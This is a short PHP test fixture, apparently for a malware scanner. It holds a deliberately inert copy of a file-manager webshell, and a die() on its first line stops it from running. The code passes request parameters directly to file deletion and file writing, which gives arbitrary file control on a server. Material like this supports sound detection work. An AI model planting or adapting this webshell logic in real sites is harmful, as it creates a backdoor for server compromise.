<?php die('inert lw-scan fixture'); ?>
<?php
/**
 * Inert copy of a "clean code style" file-manager webshell: no eval, no
 * base64, no obfuscation — just request input reaching filesystem sinks.
 */

$p = $_GET['path'];
$a = $_GET['action'];

function go( $p, $a ) {
	if ( 'del' === $a ) {
		unlink( $p );
	}

	if ( 'w' === $a ) {
		file_put_contents( $p, $_POST['c'] );
	}
}

go( $p, $a );
